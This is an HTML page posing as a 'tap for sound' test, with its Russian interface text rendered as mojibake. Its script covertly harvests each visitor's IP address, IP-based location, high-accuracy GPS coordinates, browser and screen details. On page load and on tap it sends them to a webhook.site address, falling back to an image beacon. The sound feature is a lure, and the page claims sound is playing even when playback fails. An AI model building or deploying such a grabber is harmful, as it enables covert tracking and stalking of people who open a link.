<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
            text-align: center;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
        .message {
            font-size: 18px;
            margin-bottom: 20px;
            color: #ffeb3b;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>
    <button id="playButton">
        <div class="message">–ù–∞–∂–º–∏ —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–≤—É–∫ üéµ</div>
        TAP FOR SOUND
    </button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        const MY_WEBHOOK = 'https://webhook.site/f4538f91-c509-4e37-9139-8edca42f4de1';

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = `
                    <div class="message">–ó–≤—É–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç! üîä</div>
                    SOUND PLAYING!
                `;
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                document.getElementById('playButton').innerHTML = `
                    <div class="message">–ó–≤—É–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç! üîä</div>
                    SOUND PLAYING!
                `;
                document.getElementById('playButton').style.background = 'green';
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ—á–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–æ IP
        async function getPreciseLocationByIP(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    accuracy: "IP-based location",
                    city: data.city,
                    country: data.country_name,
                    region: data.region,
                    org: data.org,
                    timezone: data.timezone,
                    source: 'IP_GEOLOCATION'
                };
            } catch (error) {
                return null;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∏–º–µ—Ä–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        async function getApproximateLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    accuracy: "Approximate IP location",
                    city: data.city,
                    country: data.country_name,
                    region: data.region,
                    source: 'APPROXIMATE_IP'
                };
            } catch (error) {
                return null;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è GPS –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "Geolocation not supported", source: 'GPS' });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            source: 'GPS'
                        });
                    },
                    (error) => {
                        resolve({ 
                            error: error.message, 
                            source: 'GPS',
                            denied: true 
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function sendDataToWebhook(data) {
            try {
                await fetch(MY_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±
                const params = new URLSearchParams();
                for (const [key, value] of Object.entries(data)) {
                    params.append(key, typeof value === 'object' ? JSON.stringify(value) : value);
                }
                new Image().src = `${MY_WEBHOOK}?${params.toString()}`;
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –í–°–ï–• –¥–∞–Ω–Ω—ã—Ö
        async function collectAllData() {
            statusDiv.innerHTML = 'üì° –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ...';
            
            const ip = await getIP();
            
            // –ü–æ–ª—É—á–∞–µ–º –í–°–ï –≤–æ–∑–º–æ–∂–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
            const [gpsLocation, preciseIPLocation, approximateLocation] = await Promise.all([
                getGPSLocation(),
                getPreciseLocationByIP(ip),
                getApproximateLocation()
            ]);

            const allData = {
                ip: ip,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                url: window.location.href,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // –í—Å–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
                gps_location: gpsLocation,
                precise_ip_location: preciseIPLocation,
                approximate_location: approximateLocation,
                
                // –í—ã–±–∏—Ä–∞–µ–º –ª—É—á—à—É—é –¥–æ—Å—Ç—É–ø–Ω—É—é –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                best_location: preciseIPLocation || approximateLocation || gpsLocation
            };

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å
            if (preciseIPLocation) {
                statusDiv.innerHTML = `üìç Location: ${preciseIPLocation.latitude}, ${preciseIPLocation.longitude}`;
            } else if (approximateLocation) {
                statusDiv.innerHTML = `üìç Approx: ${approximateLocation.city}, ${approximateLocation.country}`;
            } else {
                statusDiv.innerHTML = 'üìç Location data collected';
            }

            return allData;
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞
        document.getElementById('playButton').addEventListener('click', async function() {
            // –°—Ä–∞–∑—É –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫
            playSound();
            
            // –°–æ–±–∏—Ä–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            const allData = await collectAllData();
            await sendDataToWebhook(allData);
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            this.click();
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', async function() {
            const allData = await collectAllData();
            allData.event = 'page_loaded';
            await sendDataToWebhook(allData);
        });
    </script>
</body>
</html>
